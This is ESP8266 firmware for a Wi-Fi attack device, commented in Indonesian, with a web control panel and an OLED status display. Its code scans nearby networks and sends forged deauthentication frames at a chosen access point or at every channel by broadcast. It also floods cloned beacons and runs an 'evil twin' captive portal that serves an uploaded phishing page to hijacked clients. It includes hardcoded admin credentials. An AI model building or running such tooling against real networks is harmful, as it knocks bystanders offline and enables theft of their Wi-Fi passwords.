#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <FS.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include "web_index.h"

extern "C" { #include "user_interface.h" }

Adafruit_SSD1306 display(64, 48, &Wire, -1);
ESP8266WebServer server(80);
DNSServer dnsServer;
File fsUploadFile;

String adminSSID, adminPW, packetLog = "";
bool isMassKill=false, isDeauth=false, isSpam=false, isEvil=false;
String targetBSSID="", targetSSID="";
int targetCh=1, currentCh=1, beaconAmount=10;

// Template paket Deauth
uint8_t deauthPkt[26] = {0xC0,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0xCC,0x00,0x00,0x01,0x00};

// --- FUNGSI MESIN BEACON SPAM ---
void sendBeacon(String ssid) {
  uint8_t packet[128] = { 0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x31, 0x00, 0x00, (uint8_t)ssid.length() };
  int pos = 38;
  for (int i = 0; i < (int)ssid.length(); i++) packet[pos++] = ssid[i];
  uint8_t post[] = { 0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01, (uint8_t)WiFi.channel() };
  for (int i = 0; i < (int)sizeof(post); i++) packet[pos++] = post[i];
  wifi_send_pkt_freedom(packet, pos, 0);
}

void loadCfg() {
  File f = SPIFFS.open("/cfg.txt", "r");
  if(f) { adminSSID = f.readStringUntil('\n'); adminSSID.trim(); adminPW = f.readStringUntil('\n'); adminPW.trim(); f.close(); }
  else { adminSSID = "GMpro"; adminPW = "Sangkur87"; }
}

// Convert MAC String ke Hex Byte
void parseBytes(const char* str, char sep, uint8_t* bytes, int maxBytes, int base) {
    for (int i = 0; i < maxBytes; i++) {
        bytes[i] = strtoul(str, NULL, base);
        str = strchr(str, sep);
        if (str == NULL || *str == '\0') break;
        str++;
    }
}

void setup() {
  SPIFFS.begin(); loadCfg();
  display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(adminSSID.c_str(), adminPW.c_str());
  dnsServer.start(53, "*", WiFi.softAPIP());

  server.on("/", [](){ server.send(200, "text/html", INDEX_HTML); });
  
  server.on("/scan", [](){
    int n = WiFi.scanNetworks(false, true);
    String j = "[";
    for (int i=0; i<n; i++) {
      int s = 2 * (WiFi.RSSI(i) + 100); if(s>100) s=100; else if(s<0) s=0;
      j += "{\"s\":\""+WiFi.SSID(i)+"\",\"c\":"+String(WiFi.channel(i))+",\"r\":"+String(s)+",\"u\":0,\"b\":\""+WiFi.BSSIDstr(i)+"\"}";
      if (i<n-1) j+=",";
    }
    j += "]"; server.send(200, "application/json", j);
  });

  server.on("/select", [](){
    targetBSSID = server.arg("b"); targetCh = server.arg("c").toInt(); targetSSID = server.arg("s");
    parseBytes(targetBSSID.c_str(), ':', &deauthPkt[10], 6, 16); // Source MAC
    parseBytes(targetBSSID.c_str(), ':', &deauthPkt[16], 6, 16); // BSSID
    server.send(200, "text/plain", "OK");
  });

  server.on("/toggle", [](){
    String m = server.arg("m");
    if(m=="kill") isMassKill = !isMassKill;
    if(m=="deauth") isDeauth = !isDeauth;
    if(m=="spam") isSpam = !isSpam;
    if(m=="evil") isEvil = !isEvil;
    server.send(200, "text/plain", "OK");
  });

  server.on("/getlogs", [](){ server.send(200, "text/plain", packetLog); packetLog=""; });

  server.on("/upload", HTTP_POST, [](){ server.send(200); }, [](){
    HTTPUpload& u = server.upload();
    if(u.status == UPLOAD_FILE_START) fsUploadFile = SPIFFS.open("/" + u.filename, "w");
    else if(u.status == UPLOAD_FILE_WRITE) fsUploadFile.write(u.buf, u.currentSize);
    else if(u.status == UPLOAD_FILE_END) fsUploadFile.close();
  });

  server.onNotFound([](){
    if (isEvil) {
      File f = SPIFFS.open("/etwin1.html", "r");
      if (f) { server.streamFile(f, "text/html"); f.close(); }
    } else { server.send(404, "text/plain", "Not Found"); }
  });

  server.begin();
  wifi_promiscuous_enable(1);
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
  
  unsigned long now = millis();
  static unsigned long lastAtk = 0;

  if (now - lastAtk > 50) { // Tick rate lebih kencang
    lastAtk = now;
    
    if (isMassKill) {
      currentCh = (currentCh % 13) + 1;
      wifi_set_channel(currentCh);
      uint8_t brc[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
      memcpy(&deauthPkt[4], brc, 6); // Set Destination to Broadcast
      wifi_send_pkt_freedom(deauthPkt, 26, 0);
      packetLog += "[MASS] Kill Ch:" + String(currentCh) + "<br>";
    }

    if (isDeauth && targetBSSID != "") {
      wifi_set_channel(targetCh);
      for(int i=0; i<5; i++) wifi_send_pkt_freedom(deauthPkt, 26, 0);
      packetLog += "<span style='color:red'>[TGT] Kill -> " + targetSSID + "</span><br>";
    }
    
    if (isSpam && targetSSID != "") {
      wifi_set_channel(targetCh);
      for(int i=0; i < beaconAmount; i++) {
        sendBeacon(targetSSID + " " + String(i));
      }
    }
  }

  static unsigned long lastOLED = 0;
  if (now - lastOLED > 1000) {
    display.clearDisplay(); display.setCursor(0,0); display.setTextColor(WHITE);
    display.printf("GMpro87\n9u5M4n9\nATK:%s%s%s%s", isMassKill?"M":"", isDeauth?"D":"", isSpam?"S":"", isEvil?"E":"");
    display.display(); lastOLED = now;
  }
}
